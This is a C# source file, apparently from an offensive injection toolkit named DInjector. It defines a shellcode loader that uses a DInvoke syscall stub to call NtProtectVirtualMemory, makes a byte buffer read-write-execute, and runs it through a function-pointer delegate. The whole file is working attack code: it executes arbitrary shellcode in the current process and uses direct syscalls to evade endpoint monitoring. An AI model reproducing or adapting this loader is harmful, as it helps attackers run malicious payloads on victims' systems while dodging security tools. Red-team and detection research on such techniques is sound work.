using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class FunctionPointerV2
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcodeBytes)
        {
            var shellcode = shellcodeBytes;

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    IntPtr baseAddress = (IntPtr)ptr;

                    // -- NtProtectVirtualMemory -----------------------------------------

                    IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
                    NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

                    IntPtr oldAddress = baseAddress;
                    IntPtr regionSize = (IntPtr)shellcode.Length;
                    uint oldProtect = 0;
                    DI.Data.Native.NTSTATUS ntstatus;

                    ntstatus = sysNtProtectVirtualMemory(
                        Process.GetCurrentProcess().Handle,
                        ref baseAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                        ref oldProtect);

                    if (ntstatus == 0)
                    {
                        Console.WriteLine("[+] NtProtectVirtualMemory");
                    }
                    else
                    {
                        Console.WriteLine($"[-] NtProtectVirtualMemory: {ntstatus}");
                    }

                    pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(oldAddress, typeof(pFunction));
                    f();
                }
            }
        }
    }
}
